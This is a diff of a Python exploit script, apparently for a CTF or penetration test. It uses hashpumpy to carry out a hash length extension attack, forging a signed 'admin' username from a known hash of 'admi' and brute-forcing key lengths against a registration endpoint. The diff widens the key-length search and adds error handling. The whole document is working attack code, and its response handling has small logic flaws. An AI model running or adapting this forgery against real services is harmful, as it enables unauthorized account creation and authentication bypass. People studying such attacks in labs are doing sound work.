@@ -22,7 +22,7 @@ def generate_random_emails(nb, length):
 def main():
     # admi / '4dd28ad0560441245de6fda3973890eeb41b702d' / variable key length
     results = []
-    for i in range(6, 30):
+    for i in range(1, 54):
         data = list(hashpumpy.hashpump('4dd28ad0560441245de6fda3973890eeb41b702d', "admi", 'n', i))
         data.append(i)
         results.append(data)
@@ -35,22 +35,29 @@ def main():
 
         print("[{}] Code: {}".format(r[2], status))
         if status == 200:
-            resp = data.getvalue().decode()
-            if resp.find('Missing') > 0:
-                print("[{}] KO: Missing fields".format(r[2]))
-                break 
-            elif resp.find('Invalid') > 0: 
-                print("[{}] KO: Invalid fields".format(r[2]))
-                break
-            elif resp.find('User exist') > 0:
-                print("[{}] KO: User exist, try with another email".format(r[2]))
-                break
-            elif resp.find('Registered !') > 0:
-                print("[{}] OK: Registered".format(r[2]))
-            elif resp.find('email or password empty'):
-                print("[{}] KO: Hash doesn't work".format(r[2]))
-            else:
-                print(resp)
+            resp = ''
+            try:
+                resp = data.getvalue()
+                resp = resp.decode()
+                if resp.find('Missing') > 0:
+                    print("[{}] KO: Missing fields".format(r[2]))
+                    break 
+                elif resp.find('Invalid') > 0: 
+                    print("[{}] KO: Invalid fields".format(r[2]))
+                    break
+                elif resp.find('User exist') > 0:
+                    print("[{}] KO: User exist, try with another email".format(r[2]))
+                    break
+                elif resp.find('Registered !') > 0:
+                    print("[{}] OK: Registered".format(r[2]))
+                elif resp.find('email or password empty'):
+                    print("[{}] KO: Hash doesn't work".format(r[2]))
+                else:
+                    print(resp)
+            except Exception as exc:
+                print("[{}] KO: body length {} => {}".format(r[2], len(resp), exc))
+                print(resp.decode('latin-1'))
+                pass
 
 if __name__ == "__main__":
     main()
